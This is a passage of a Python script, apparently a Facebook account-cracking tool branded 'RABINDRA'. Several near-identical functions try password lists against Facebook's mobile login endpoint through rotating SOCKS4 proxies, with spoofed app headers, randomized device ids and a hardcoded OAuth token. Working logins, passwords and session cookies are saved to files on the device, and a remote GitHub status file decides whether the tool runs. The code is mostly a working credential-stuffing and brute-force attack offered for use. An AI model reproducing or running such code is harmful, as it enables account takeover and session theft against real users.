            headers={'User-Agent': '[FBAN/FB4A;FBAV/'+str(random.randint(11,99))+'.0.0.'+str(random.randint(1111,9999))+';FBBV/'+str(random.randint(1111111,9999999))+';'f'{R3}','Accept-Encoding':  'gzip, deflate','Accept': '*/*','Connection': 'keep-alive','Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32','X-FB-Friendly-Name': 'authenticate','X-FB-Connection-Bandwidth': str(random.randint(20000, 40000)),'X-FB-Net-HNI': str(random.randint(20000, 40000)),'X-FB-SIM-HNI': str(random.randint(20000, 40000)),'X-FB-Connection-Type': 'unknown','Content-Type': 'application/x-www-form-urlencoded','X-FB-HTTP-Engine': 'Liger'}
            url = 'https://b-graph.facebook.com/auth/login'
            po = requests.post(url,data=data,headers=headers,proxies=bro).text
            q = json.loads(po)
            if 'session_key' in q:
                ...
                if 'Photoshop' in res:
                    print(f"\r\r {red}[{green}RABINDRA-OK{red}] {green}{uid} {red}| {green}{pas} ")
                    oks.append(ids)
                    open('/sdcard/RABINDRA/RABINDRA-M3-RNOM-OK.txt','a').write(uid+'|'+pas+'|'+ckkk+'\n')
                    print(f"\r\r {red}[{green}COOKIE{red}]{green} ={abir} {coki}")
                    break
            elif 'www.facebook.com' in q:
                cps.append(ids)
...
def randm3(ids,psd,tl):
    ...
    try:
        for pas in psd:
            ...
            bro={"http":"socks4://"+prox}
            data={'adid': str(uuid.uuid4()),'format': 'json','device_id': str(uuid.uuid4()),'email': ids,'password': pas,'generate_analytics_claims': '1','community_id': '','cpl': 'true','try_num': '1','family_device_id': str(uuid.uuid4()),'credentials_type': 'password','source': 'login','error_detail_type': 'button_with_disabled','enroll_misauth': 'false','generate_session_cookies': '1','generate_machine_id': '1','currently_logged_in_userid': '0','locale': 'en_GB','client_country_code': 'GB','fb_api_req_friendly_name': 'authenticate'}
            headers={'User-Agent': '[FBAN/FB4A;FBAV/'+str(random.randint(11,99))+'.0.0.'+str(random.randint(1111,9999))+';FBBV/'+str(random.randint(1111111,9999999))+';'f'{R4}','Accept-Encoding':  'gzip, deflate','Accept': '*/*','Connection': 'keep-alive','Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32','X-FB-Friendly-Name': 'authenticate','X-FB-Connection-Bandwidth': str(random.randint(20000, 40000)),'X-FB-Net-HNI': str(random.randint(20000, 40000)),'X-FB-SIM-HNI': str(random.randint(20000, 40000)),'X-FB-Connection-Type': 'unknown','Content-Type': 'application/x-www-form-urlencoded','X-FB-HTTP-Engine': 'Liger'}
            url = 'https://b-graph.facebook.com/auth/login'
            po = requests.post(url,data=data,headers=headers,proxies=bro).text
            q = json.loads(po)
            if 'session_key' in q:
                ...
                if 'Photoshop' in res:
                    print(f"\r\r {red}[{green}RABINDRA-OK{red}] {green}{uid} {red}| {green}{pas} ")
                    oks.append(ids)
                    open('/sdcard/RABINDRA/RABINDRA-RNOM-OK.txt','a').write(uid+'|'+pas+'|'+ckkk+'\n')
                    print(f"\r\r {red}[{green}COOKIE{red}]{green} ={abir} {coki}")
                    break
            elif 'www.facebook.com' in q:
                cps.append(ids)
...
def randm4(ids,psd,tl):
    ...
    try:
        for pas in psd:
            ...
            bro={"http":"socks4://"+prox}
            data={'adid': str(uuid.uuid4()),'format': 'json','device_id': str(uuid.uuid4()),'email': ids,'password': pas,'generate_analytics_claims': '1','community_id': '','cpl': 'true','try_num': '1','family_device_id': str(uuid.uuid4()),'credentials_type': 'password','source': 'login','error_detail_type': 'button_with_disabled','enroll_misauth': 'false','generate_session_cookies': '1','generate_machine_id': '1','currently_logged_in_userid': '0','locale': 'en_GB','client_country_code': 'GB','fb_api_req_friendly_name': 'authenticate'}
            headers={'User-Agent': '[FBAN/FB4A;FBAV/'+str(random.randint(11,99))+'.0.0.'+str(random.randint(1111,9999))+';FBBV/'+str(random.randint(1111111,9999999))+';'f'{R5}','Accept-Encoding':  'gzip, deflate','Accept': '*/*','Connection': 'keep-alive','Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32','X-FB-Friendly-Name': 'authenticate','X-FB-Connection-Bandwidth': str(random.randint(20000, 40000)),'X-FB-Net-HNI': str(random.randint(20000, 40000)),'X-FB-SIM-HNI': str(random.randint(20000, 40000)),'X-FB-Connection-Type': 'unknown','Content-Type': 'application/x-www-form-urlencoded','X-FB-HTTP-Engine': 'Liger'}
            url = 'https://b-graph.facebook.com/auth/login'
            po = requests.post(url,data=data,headers=headers,proxies=bro).text
            q = json.loads(po)
            if 'session_key' in q:
                ...
                cps.append(ids)
                print(f"\r\r {green}[{red}RABINDRA-CP{green}] {uid} {blue}|{green} {pas} ")
                open('/sdcard/RABINDRA/RABINDRA-RNOM-CP.txt','a').write(ids+'|'+pas+'\n')
                break
            else:continue
        loop+=1
...
def randm5(ids,psd,tl):
    ...
    try:
        for pas in psd:
            ...
            bro={"http":"socks4://"+prox}
            data={'adid': str(uuid.uuid4()),'format': 'json','device_id': str(uuid.uuid4()),'email': ids,'password': pas,'generate_analytics_claims': '1','community_id': '','cpl': 'true','try_num': '1','family_device_id': str(uuid.uuid4()),'credentials_type': 'password','source': 'login','error_detail_type': 'button_with_disabled','enroll_misauth': 'false','generate_session_cookies': '1','generate_machine_id': '1','currently_logged_in_userid': '0','locale': 'en_GB','client_country_code': 'GB','fb_api_req_friendly_name': 'authenticate'}
            headers={'User-Agent': '[FBAN/FB4A;FBAV/'+str(random.randint(11,99))+'.0.0.'+str(random.randint(1111,9999))+';FBBV/'+str(random.randint(1111111,9999999))+';'f'{R6}','Accept-Encoding':  'gzip, deflate','Accept': '*/*','Connection': 'keep-alive','Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32','X-FB-Friendly-Name': 'authenticate','X-FB-Connection-Bandwidth': str(random.randint(20000, 40000)),'X-FB-Net-HNI': str(random.randint(20000, 40000)),'X-FB-SIM-HNI': str(random.randint(20000, 40000)),'X-FB-Connection-Type': 'unknown','Content-Type': 'application/x-www-form-urlencoded','X-FB-HTTP-Engine': 'Liger'}
            url = 'https://b-graph.facebook.com/auth/login'
            po = requests.post(url,data=data,headers=headers,proxies=bro).text
            q = json.loads(po)
            if 'session_key' in q:
...
if __name__ == "__main__":
    cntrl = requests.get('https://raw.githubusercontent.com/RABINDRA-404/Control-room/main/Control-status/status').text
    if 'trail' in cntrl:___Rabindra___MaIN___MenU___()
